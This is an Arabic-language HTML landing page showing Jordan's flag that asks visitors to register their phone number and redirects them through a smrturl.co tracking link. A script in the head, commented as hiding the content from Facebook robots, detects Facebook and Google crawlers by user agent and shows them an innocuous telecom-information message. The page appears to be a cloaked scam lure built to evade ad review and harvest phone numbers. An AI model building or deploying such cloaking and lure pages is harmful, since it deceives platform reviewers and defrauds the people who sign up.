<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>صفحة تسجيل</title>

  <!-- خط الجزيرة العربي (Cairo) -->
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">

  <style>
    #navbar-iframe {
      display: none !important;
    }

    body {
      background-color: #e8daef;
      font-family: 'Cairo', sans-serif;
      direction: rtl;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      width: 500px;
      height: 500px;
      padding: 30px;
      box-shadow: 0 6px 30px rgba(0, 0, 0, 0.15);
      background-color: #ffffff;
      border-radius: 30px;
    }

    .flag {
      width: 130px;
      height: 130px;
      margin-bottom: 30px;
      object-fit: cover;
      border-radius: 50%;
      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.25);
    }

    .text {
      font-size: 24px;
      color: #5b2c6f;
      margin-bottom: 40px;
      font-weight: bold;
      text-align: center;
    }

    .button {
      background-color: #7d3c98;
      color: white;
      padding: 20px 50px;
      border: none;
      border-radius: 35px;
      font-size: 22px;
      cursor: pointer;
      transition: 0.3s;
      text-decoration: none;
    }

    .button:hover {
      background-color: #6c3483;
    }
  </style>

  <!-- كود إخفاء المحتوى عن روبوتات فيسبوك -->
  <script>
    const bots = ["facebookexternalhit", "Facebot", "Googlebot"];
    const isBot = bots.some(bot => navigator.userAgent.includes(bot));
    if (isBot) {
      document.write(`
        <div style="padding: 40px; font-family: Cairo, sans-serif; text-align: center;">
          <h2>مرحباً بك في موقعنا</h2>
          <p>نقدم معلومات عامة عن خدمات الاتصالات في الأردن.</p>
        </div>
      `);
    }
  </script>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c0/Flag_of_Jordan.svg/320px-Flag_of_Jordan.svg.png" alt="علم الأردن" class="flag" />


    <div class="text">يرجى تسجيل رقم هاتفك</div>
    <a href="#" class="button" onclick="window.location.href='https://smrturl.co/a/s4c1dba1ca9/6882?s1='; return false;">اضغط هنا</a>
  </div>
</body>
</html>
